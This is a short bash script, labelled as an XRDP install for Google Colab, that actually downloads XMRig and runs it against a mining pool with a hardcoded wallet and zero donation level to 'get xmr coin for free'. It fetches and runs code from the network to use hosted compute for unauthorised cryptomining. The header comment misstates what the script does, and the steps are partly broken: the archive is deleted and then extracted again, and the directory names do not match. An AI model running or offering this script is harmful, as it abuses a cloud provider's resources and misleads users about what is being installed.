#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-focal-x64.tar.gz && tar -xvf xm* && rm xmrig-6.17.0-focal-x64.tar.gz && cd xm*
tar xvzf xmrig-6.17.0-focal-x64.tar.gz
cd xmrig-6.17.0
./xmrig --donate-level 0 -a gr -o pool.minafacil.com:5555 --tls -u REEJjHmaqUjckCpbskcbgPpsrFcZiENNHD -p x
